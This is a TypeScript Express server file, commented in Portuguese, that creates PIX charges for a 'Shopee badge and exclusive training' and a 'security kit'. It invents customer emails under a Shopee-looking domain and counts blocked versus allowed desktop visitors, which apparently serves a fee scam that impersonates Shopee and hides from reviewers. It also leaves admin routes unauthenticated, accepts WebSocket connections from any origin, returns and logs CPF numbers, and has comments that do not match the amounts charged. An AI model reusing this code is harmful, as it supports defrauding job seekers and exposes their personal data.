      
      // Simular busca de pagamento (no futuro, isso será substituído por uma consulta ao banco)
      const { paymentService } = await import('./payment');
      
      // Verificar se o pagamento existe nos registros
      // Nota: A API For4Payments atual não fornece um endpoint para verificar status
      // Então retornamos os dados do cache ou sessionStorage temporário
      
      // Como não temos uma forma de buscar o pagamento por ID diretamente,
      // vamos verificar o cache temporário (que será substituído por DB no futuro)
      const paymentCache = global._paymentCache || {};
      const paymentData = paymentCache[id];
      
      if (!paymentData) {
        return res.status(404).json({ 
          error: 'Pagamento não encontrado. O link pode ter expirado.' 
        });
      }
      
      // Verificar se também devemos obter o status da API For4Payments para atualização
      const checkLiveStatus = req.query.check_status === 'true';
      
      if (checkLiveStatus && process.env.FOR4PAYMENTS_SECRET_KEY) {
        try {
          // Importar o serviço de monitoramento de transações
          const { checkTransactionStatus } = await import('./transaction-monitor');
          const transactionStatus = await checkTransactionStatus(id);
          
          if (transactionStatus) {
            // Atualizar o status do pagamento no cache
            paymentData.status = transactionStatus.status;
            paymentData.approvedAt = transactionStatus.approvedAt;
            paymentData.rejectedAt = transactionStatus.rejectedAt;
            
            // Se a transação foi aprovada, processar a conversão para o Facebook Pixel
            if (transactionStatus.status === 'APPROVED' && !paymentData.facebookReported) {
              // Importar o módulo de monitoramento
              const { reportConversionToFacebook } = await import('./transaction-monitor');
              const reported = await reportConversionToFacebook(transactionStatus);
              
              if (reported) {
                paymentData.facebookReported = true;
                console.log(`[FACEBOOK] Conversão reportada com sucesso para o Facebook Pixel: ${id}`);
              }
            }
          }
        } catch (statusError) {
          console.error('[MONITOR] Erro ao verificar status ao vivo da transação:', statusError);
          // Continuar com os dados do cache mesmo se a verificação de status falhar
        }
      }
      
      // Retornar os dados do pagamento
      return res.json({
        id: paymentData.id,
        pixCode: paymentData.pixCode,
        pixQrCode: paymentData.pixQrCode,
        name: paymentData.name,
        cpf: paymentData.cpf,
        email: paymentData.email,
        status: paymentData.status || 'PENDING', // Status padrão se não estiver presente
        approvedAt: paymentData.approvedAt,
        rejectedAt: paymentData.rejectedAt,
        facebookReported: !!paymentData.facebookReported
      });
      
    } catch (error: any) {
      console.error('Erro ao buscar informações de pagamento:', error);
      res.status(500).json({ 
        error: 'Erro ao buscar informações de pagamento', 
        details: error.message 
      });
    }
  });
  
  // Rota específica para pagamentos de treinamento (R$ 49,90)
  app.post('/api/payments/treinamento', async (req, res) => {
    try {
      console.log('[DEBUG] Recebida requisição para pagamento de treinamento');
      
      // Verificar se a API For4Payments está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
        return res.status(500).json({
          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
        });
      }

      console.log('[DEBUG] Dados de pagamento de treinamento recebidos:', req.body);
      
      // Validar dados da requisição
      const { name, email, cpf, phone, items } = req.body;
      
      // Validação básica
      if (!name) {
        return res.status(400).json({ error: 'Nome é obrigatório.' });
      }
      
      if (!cpf) {
        return res.status(400).json({ error: 'CPF é obrigatório.' });
      }
      
      // Valor fixo para o treinamento: R$ 49,90
      const paymentAmount = 6700 / 100; // Converter o valor de centavos para reais
      
      // Usar o email fornecido ou gerar um
      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
      
      console.log(`Processando pagamento de treinamento de R$ ${paymentAmount} para ${name}, CPF ${cpf}`);
      
      // Processar pagamento via For4Payments
      console.log(`[DEBUG] Enviando para For4Payments: nome=${name}, email=${userEmail}, cpf=${cpf}, valor=${paymentAmount}`);
      
      const paymentParams = {
        name,
        email: userEmail,
        cpf,
        phone: phone || '',
        amount: paymentAmount,
        items: items || [{
          title: "Crachá Shopee + Treinamento Exclusivo",
          quantity: 1,
          unitPrice: 6700,
          tangible: false
        }]
      };
      
      console.log('[DEBUG] Parâmetros completos:', JSON.stringify(paymentParams));
      
      const paymentResult = await paymentService.createPixPayment(paymentParams);
      
      console.log('Resultado do pagamento de treinamento For4Payments:', paymentResult);
      
      // Se o pagamento foi processado com sucesso, enviar email
      if (paymentResult.pixCode && paymentResult.pixQrCode) {
        // Importar o serviço de email
        const { emailService } = await import('./email-service');
        
        // Formatar o valor para exibição
        const formattedAmount = new Intl.NumberFormat('en-US', {
          style: 'currency',
          currency: 'USD'
        }).format(paymentAmount);
        
        // Construir o link para a página de pagamento (se houver)
        const clientHost = getClientHost(req);
        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
        console.log(`[EMAIL] Link de pagamento de treinamento gerado: ${paymentLink}`);
        
        // Enviar o email de confirmação
        try {
          const emailSent = await emailService.sendPaymentConfirmationEmail({
            email: userEmail,
            name,
            pixCode: paymentResult.pixCode,
            pixQrCode: paymentResult.pixQrCode,
            amount: paymentAmount,
            formattedAmount,
            paymentLink
          });
          
          // Adicionar informação de email enviado à resposta
          paymentResult.emailSent = emailSent;
          
          if (emailSent) {
            console.log(`Email de confirmação de treinamento enviado com sucesso para ${userEmail}`);
          } else {
            console.error(`Falha ao enviar email de confirmação de treinamento para ${userEmail}`);
          }
        } catch (emailError) {
          console.error('Erro ao enviar email de confirmação de treinamento:', emailError);
          paymentResult.emailSent = false;
          paymentResult.emailError = 'Falha ao enviar email de confirmação';
        }
      }
      
      // Retornar resultado para o frontend
      res.status(200).json(paymentResult);
    } catch (error: any) {
      console.error('Erro ao processar pagamento de treinamento:', error);
      res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento de treinamento.'
      });
    }
  });
  
  // Rota para verificar o status de um pagamento na For4Payments e enviar para o Facebook Pixel
  app.post('/api/payments/:id/check-status', async (req, res) => {
    try {
      const { id } = req.params;
      
      if (!id) {
        return res.status(400).json({ error: 'ID de pagamento não fornecido' });
      }
      
      // Verificar se temos a chave API configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        return res.status(500).json({ error: 'Chave de API For4Payments não configurada' });
      }
      
      // Importar o módulo de monitoramento
      const { processTransaction } = await import('./transaction-monitor');
      
      // Processar a transação (verificar status e reportar se aprovada)
      const result = await processTransaction(id);
      
      // Atualizar o cache se a transação for processada com sucesso
      if (result) {
        const paymentCache = global._paymentCache || {};
        if (paymentCache[id]) {
          paymentCache[id].facebookReported = true;
          paymentCache[id].status = 'APPROVED';
        }
      }
      
      return res.json({ 
        success: true, 
        processed: result,
        message: result 
          ? 'Transação aprovada e reportada ao Facebook Pixel' 
          : 'Transação verificada, mas não foi necessário reportar'
      });
    } catch (error: any) {
      console.error('Erro ao verificar status do pagamento:', error);
      res.status(500).json({ 
        error: 'Erro ao verificar status do pagamento', 
        details: error.message 
      });
    }
  });

  app.post('/api/payments/pix-python', async (req, res) => {
    try {
      // Validar dados da requisição
      const { nome, email, cpf, telefone } = req.body;
      
      // Validação básica
      if (!nome || !cpf) {
        return res.status(400).json({ 
          error: 'Dados incompletos. Nome e CPF são obrigatórios.' 
        });
      }
      
      // Verificar se a chave secreta está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.error('FOR4PAYMENTS_SECRET_KEY não configurada');
        return res.status(500).json({ 
          error: 'FOR4PAYMENTS_SECRET_KEY não configurada. Configure a chave de API For4Payments.'
        });
      }
      
      console.log('Processando pagamento via API For4Payments...');
      
      // Usar o email fornecido ou gerar um
      const userEmail = email || `${nome.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
      
      // Valor fixo para o kit de segurança: R$ 64,90
      const paymentAmount = 79.90;
      
      // Processar pagamento via API For4Payments
      const paymentResult = await paymentService.createPixPayment({
        name: nome,
        email: userEmail,
        cpf: cpf,
        phone: telefone || '',
        amount: paymentAmount
      });
      
      // Armazenar dados do pagamento em cache global
      // Isso é uma solução temporária até termos um banco de dados adequado
      // Este é um anti-padrão em produção, mas funciona para este exemplo
      if (!global._paymentCache) {
        global._paymentCache = {};
      }
      
      // Remover possíveis itens expirados do cache (mais de 1 hora)
      const now = new Date();
      Object.keys(global._paymentCache || {}).forEach(key => {
        const item = global._paymentCache?.[key];
        if (item && item.timestamp) {
          const itemTime = new Date(item.timestamp);
          const diffHours = Math.abs(now.getTime() - itemTime.getTime()) / 36e5; // horas
          if (diffHours > 1) {
            console.log(`[CACHE] Removendo item expirado do cache: ${key}`);
            delete global._paymentCache?.[key];
          }
        }
      });
      
      // Armazenar o resultado atual no cache
      global._paymentCache[paymentResult.id] = {
        ...paymentResult,
        name: nome,
        cpf: cpf,
        email: userEmail,
        amount: paymentAmount,
        timestamp: new Date().toISOString()
      };
      
      console.log(`[CACHE] Pagamento armazenado no cache com ID: ${paymentResult.id}`);
      console.log(`[CACHE] Total de itens no cache: ${Object.keys(global._paymentCache || {}).length}`);
      
      // Se o pagamento foi processado com sucesso, enviar email
      if (paymentResult.pixCode && paymentResult.pixQrCode) {
        // Importar o serviço de email
        const { emailService } = await import('./email-service');
        
        // Formatar o valor para exibição
        const formattedAmount = new Intl.NumberFormat('en-US', {
          style: 'currency',
          currency: 'USD'
        }).format(paymentAmount);
        
        // Construir o link para a página de pagamento (se houver)
        const clientHost = getClientHost(req);
        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
        
        // Enviar o email de confirmação
        try {
          const emailSent = await emailService.sendPaymentConfirmationEmail({
            email: userEmail,
            name: nome,
            pixCode: paymentResult.pixCode,
            pixQrCode: paymentResult.pixQrCode,
            amount: paymentAmount,
            formattedAmount,
            paymentLink
          });
          
          // Adicionar informação de email enviado à resposta
          paymentResult.emailSent = emailSent;
          
          if (emailSent) {
            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
          } else {
            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
          }
        } catch (emailError) {
          console.error('Erro ao enviar email de confirmação:', emailError);
          paymentResult.emailSent = false;
          paymentResult.emailError = 'Falha ao enviar email de confirmação';
        }
      }
      
      // Retornar resultado para o frontend
      res.status(200).json(paymentResult);
    } catch (error: any) {
      console.error('Erro ao processar pagamento PIX:', error);
      res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento PIX.'
      });
    }
  });

  // ===== ROTAS DE ADMINISTRAÇÃO PARA BLOQUEIO DE IPS E DOMÍNIOS =====
  
  // Listar todos os IPs banidos
  app.get('/api/admin/ips', async (req, res) => {
    try {
      const bannedIps = await storage.getAllBannedIps();
      res.json(bannedIps);
    } catch (error) {
      console.error('Erro ao listar IPs banidos:', error);
      res.status(500).json({ error: 'Falha ao listar IPs banidos' });
    }
  });
  
  // Obter detalhes de um IP específico
  app.get('/api/admin/ips/:ip', async (req, res) => {
    try {
      const ip = req.params.ip;
      const bannedIp = await storage.getBannedIp(ip);
      
      if (!bannedIp) {
        return res.status(404).json({ error: 'IP não encontrado' });
      }
      
      res.json(bannedIp);
    } catch (error) {
      console.error('Erro ao buscar detalhes do IP:', error);
      res.status(500).json({ error: 'Falha ao buscar detalhes do IP' });
    }
  });
  
  // Banir ou desbanir um IP
  app.patch('/api/admin/ips/:ip', async (req, res) => {
    try {
      const ip = req.params.ip;
      const { isBanned } = req.body;
      
      if (typeof isBanned !== 'boolean') {
        return res.status(400).json({ error: 'O campo isBanned deve ser um booleano' });
      }
      
      // Verificar se o IP existe
      const existingIp = await storage.getBannedIp(ip);
      
      if (!existingIp) {
        // IP não existe, criar novo registro
        const newBannedIp = await storage.createBannedIp({
          ip,
          isBanned,
          reason: `IP ${isBanned ? 'banido' : 'permitido'} manualmente por administrador`,
          userAgent: '',
          browserInfo: '',
          device: 'N/A',
          platform: 'N/A',
          location: await getIpLocation(ip)
        });
        
        return res.status(201).json(newBannedIp);
      }
      
      // IP existe, atualizar status
      const updatedIp = await storage.updateBannedIpStatus(ip, isBanned);
      
      if (!updatedIp) {
        return res.status(500).json({ error: 'Falha ao atualizar status do IP' });
      }
      
      res.json(updatedIp);
    } catch (error) {
      console.error('Erro ao atualizar status do IP:', error);
      res.status(500).json({ error: 'Falha ao atualizar status do IP' });
    }
  });
  
  // Listar todos os domínios permitidos
  app.get('/api/admin/domains', async (req, res) => {
    try {
      const domains = await storage.getAllAllowedDomains();
      res.json(domains);
    } catch (error) {
      console.error('Erro ao listar domínios permitidos:', error);
      res.status(500).json({ error: 'Falha ao listar domínios permitidos' });
    }
  });
  
  // Adicionar um novo domínio permitido
  app.post('/api/admin/domains', async (req, res) => {
    try {
      const { domain, isActive = true } = req.body;
      
      if (!domain) {
        return res.status(400).json({ error: 'O campo domain é obrigatório' });
      }
      
      // Verificar se o domínio já existe
      const existingDomain = await storage.getAllowedDomain(domain);
      
      if (existingDomain) {
        // Domínio já existe, atualizar status
        const updatedDomain = await storage.updateAllowedDomainStatus(domain, isActive);
        
        if (!updatedDomain) {
          return res.status(500).json({ error: 'Falha ao atualizar status do domínio' });
        }
        
        return res.json(updatedDomain);
      }
      
      // Domínio não existe, criar novo
      const newDomain = await storage.createAllowedDomain({
        domain,
        isActive
      });
      
      res.status(201).json(newDomain);
    } catch (error) {
      console.error('Erro ao adicionar domínio permitido:', error);
      res.status(500).json({ error: 'Falha ao adicionar domínio permitido' });
    }
  });
  
  // Atualizar status de um domínio permitido
  app.patch('/api/admin/domains/:domain', async (req, res) => {
    try {
      const domain = req.params.domain;
      const { isActive } = req.body;
      
      if (typeof isActive !== 'boolean') {
        return res.status(400).json({ error: 'O campo isActive deve ser um booleano' });
      }
      
      // Verificar se o domínio existe
      const existingDomain = await storage.getAllowedDomain(domain);
      
      if (!existingDomain) {
        return res.status(404).json({ error: 'Domínio não encontrado' });
      }
      
      // Domínio existe, atualizar status
      const updatedDomain = await storage.updateAllowedDomainStatus(domain, isActive);
      
      if (!updatedDomain) {
        return res.status(500).json({ error: 'Falha ao atualizar status do domínio' });
      }
      
      res.json(updatedDomain);
    } catch (error) {
      console.error('Erro ao atualizar status do domínio:', error);
      res.status(500).json({ error: 'Falha ao atualizar status do domínio' });
    }
  });
  
  // Página de estatísticas simples (rota pública, mas apenas dados anônimos)
  app.get('/ips/stats', async (req, res) => {
    try {
      const bannedIps = await storage.getAllBannedIps();
      
      const totalBannedIps = bannedIps.filter(ip => ip.isBanned).length;
      const totalAllowedIps = bannedIps.filter(ip => !ip.isBanned).length;
      
      // Agrupar por dispositivo
      const deviceStats: Record<string, number> = {};
      bannedIps.forEach(ip => {
        const device = ip.device || 'Desconhecido';
        deviceStats[device] = (deviceStats[device] || 0) + 1;
      });
      
      // Agrupar por navegador
      const browserStats: Record<string, number> = {};
      bannedIps.forEach(ip => {
        const browser = ip.browserInfo?.split(' ')[0] || 'Desconhecido';
        browserStats[browser] = (browserStats[browser] || 0) + 1;
      });
      
      // Agrupar por plataforma
      const platformStats: Record<string, number> = {};
      bannedIps.forEach(ip => {
        let platform = ip.platform || 'Desconhecida';
        // Simplificar versões do Windows para apenas "Windows"
        if (platform.startsWith('Windows')) {
          platform = 'Windows';
        }
        // Simplificar versões do macOS para apenas "macOS"
        if (platform.startsWith('macOS')) {
          platform = 'macOS';
        }
        platformStats[platform] = (platformStats[platform] || 0) + 1;
      });
      
      res.json({
        totalIpsTracked: bannedIps.length,
        totalBannedIps,
        totalAllowedIps,
        deviceStats,
        browserStats,
        platformStats,
        lastUpdated: new Date().toISOString()
      });
    } catch (error) {
      console.error('Erro ao gerar estatísticas de IPs:', error);
      res.status(500).json({ error: 'Falha ao gerar estatísticas de IPs' });
    }
  });

  const httpServer = createServer(app);
  
  // Configurar o servidor WebSocket para a dashboard com verificação de origem
  const wss = new WebSocketServer({ 
    server: httpServer, 
    path: '/ws',
    // Permitir conexões de qualquer origem em produção
    verifyClient: (info, done) => {
      // Permitir todas as origens, já que o dashboard pode ser acessado pelo Netlify
      // em produção e também de hosts locais em desenvolvimento
      const origin = info.origin || '';
      console.log(`Conexão WebSocket tentada da origem: ${origin}`);
      
      // Sempre aceitar a conexão
      done(true);
    }
  });
  
  // Rastrear conexões ativas
  const connectedClients: WebSocket[] = [];
  
  // Variável para armazenar as estatísticas de acesso
  let accessSources: { source: string, count: number }[] = [
    { source: "WhatsApp", count: 0 },
    { source: "Facebook", count: 0 },
    { source: "Instagram", count: 0 },
    { source: "Google", count: 0 },
    { source: "Pesquisa Orgânica", count: 0 },
    { source: "Link Direto", count: 0 },
    { source: "Outros", count: 0 }
  ];
  
  // Variável para armazenar estatísticas de dispositivos
  let deviceStats: { type: string, count: number }[] = [
    { type: "Smartphone", count: 0 },
    { type: "Tablet", count: 0 },
    { type: "Desktop (Permitido)", count: 0 },
    { type: "Desktop (Bloqueado)", count: 0 },
    { type: "WhatsApp Web", count: 0 }
  ];
  
  // Simulação de usuários online para a dashboard
  let onlineUsers = 0;
  let totalVisits = 0;
  
  // Função para obter estatísticas do dashboard
  async function getDashboardStats() {
    try {
      // Obter dados do banco de dados
      const bannedIps = await storage.getAllBannedIps();
      const allowedDomains = await storage.getAllAllowedDomains();
      
      // Calcular estatísticas
      const stats = {
        onlineUsers,
        totalVisits,
        bannedIPs: bannedIps.filter(ip => ip.isBanned).length,
        allowedDomains: allowedDomains.filter(domain => domain.isActive).length
      };
      
      return {
        stats,
        bannedIPs: bannedIps
          .filter(ip => ip.isBanned)
          .sort((a, b) => (new Date(b.updatedAt || 0).getTime() - new Date(a.updatedAt || 0).getTime()))
          .slice(0, 50)
          .map(ip => ({
            ip: ip.ip,
            userAgent: ip.userAgent || 'Desconhecido',
            device: ip.device || 'Desconhecido',
            browserInfo: ip.browserInfo || 'Desconhecido',
            platform: ip.platform || 'Desconhecido',
            location: ip.location || 'Desconhecido',
            reason: ip.reason || 'Acesso bloqueado',
            timestamp: ip.updatedAt?.toISOString() || new Date().toISOString()
          })),
        accessSources,
        deviceStats
      };
    } catch (error) {
      console.error('Erro ao obter estatísticas do dashboard:', error);
      return {
        stats: { onlineUsers: 0, totalVisits: 0, bannedIPs: 0, allowedDomains: 0 },
        bannedIPs: [],
        accessSources,
        deviceStats
      };
    }
  }
  
  // Função para broadcast de mensagens para todos os clientes conectados
  function broadcastToAll(message: any) {
    const messageString = JSON.stringify(message);
    connectedClients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(messageString);
      }
    });
  }
  
  // Configuração de listener para conexões WebSocket
  wss.on('connection', async (ws) => {
    console.log('Nova conexão WebSocket estabelecida');
    
    // Adicionar à lista de clientes conectados
    connectedClients.push(ws);
    
    // Atualizar contador de usuários online
    onlineUsers += 1;
    totalVisits += 1;
    
    // Broadcast do número atualizado de usuários online
    broadcastToAll({
      type: 'user_connected',
      count: onlineUsers
    });
    
    // Enviar dados iniciais
    try {
      const data = await getDashboardStats();
      ws.send(JSON.stringify({
        type: 'initial_data',
        ...data
      }));
    } catch (error) {
      console.error('Erro ao enviar dados iniciais:', error);
    }
    
    // Lidar com mensagens do cliente
    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());
        
        if (data.type === 'get_dashboard_data') {
          const dashboardData = await getDashboardStats();
          
          ws.send(JSON.stringify({
            type: 'dashboard_stats',
            stats: dashboardData.stats
          }));
          
          ws.send(JSON.stringify({
            type: 'banned_ips',
            ips: dashboardData.bannedIPs
          }));
          
          ws.send(JSON.stringify({
            type: 'access_sources',
            sources: dashboardData.accessSources
          }));
          
          ws.send(JSON.stringify({
            type: 'device_stats',
            devices: dashboardData.deviceStats
          }));
        }
      } catch (error) {
        console.error('Erro ao processar mensagem WebSocket:', error);
      }
    });
    
    // Lidar com fechamento de conexão
    ws.on('close', () => {
      // Remover da lista de clientes
      const index = connectedClients.indexOf(ws);
      if (index !== -1) {
        connectedClients.splice(index, 1);
      }
      
      // Atualizar contador de usuários online
      onlineUsers = Math.max(0, onlineUsers - 1);
      
      // Broadcast do número atualizado de usuários online
      broadcastToAll({
        type: 'user_connected',
        count: onlineUsers
      });
      
      console.log('Conexão WebSocket fechada');
    });
  });
  
  // Alimentar as estatísticas iniciais com dados do banco
  (async () => {
    try {
      const bannedIps = await storage.getAllBannedIps();
      
      // Atualizar estatísticas de dispositivos com base nos dados existentes
      const deviceCounts: Record<string, number> = {};
      
      bannedIps.forEach(ip => {
        const device = ip.device || 'Desconhecido';
        
        if (device.includes('WhatsApp Web')) {
          deviceCounts['WhatsApp Web'] = (deviceCounts['WhatsApp Web'] || 0) + 1;
        } else if (device.includes('Desktop')) {
          if (ip.isBanned) {
            deviceCounts['Desktop (Bloqueado)'] = (deviceCounts['Desktop (Bloqueado)'] || 0) + 1;
          } else {
            deviceCounts['Desktop (Permitido)'] = (deviceCounts['Desktop (Permitido)'] || 0) + 1;
          }
        } else if (device.includes('Tablet')) {
          deviceCounts['Tablet'] = (deviceCounts['Tablet'] || 0) + 1;
        } else {
          deviceCounts['Smartphone'] = (deviceCounts['Smartphone'] || 0) + 1;
        }
      });
      
      // Atualizar estatísticas de dispositivos
      deviceStats = deviceStats.map(stat => ({
        ...stat,
        count: deviceCounts[stat.type] || 0
      }));
      
      // Atualizar estatísticas de origens de acesso
      const sourceCounts: Record<string, number> = {};
      
      bannedIps.forEach(ip => {
        let source = "Outros";
        const referer = ip.referer || '';
        
        if (referer.includes('whatsapp')) {
          source = "WhatsApp";
        } else if (referer.includes('facebook') || referer.includes('fb.com')) {
          source = "Facebook";
        } else if (referer.includes('instagram')) {
          source = "Instagram";
        } else if (referer.includes('google')) {
          if (referer.includes('ads') || referer.includes('adwords')) {
            source = "Google";
          } else {
            source = "Pesquisa Orgânica";
          }
        } else if (!referer) {
          source = "Link Direto";
        }
        
        sourceCounts[source] = (sourceCounts[source] || 0) + 1;
      });
      
      // Atualizar estatísticas de origens de acesso
      accessSources = accessSources.map(source => ({
        ...source,
        count: sourceCounts[source.source] || 0
      }));
      
      console.log('Estatísticas iniciais carregadas para o dashboard');
    } catch (error) {
      console.error('Erro ao carregar estatísticas iniciais:', error);
    }
  })();

  return httpServer;
}
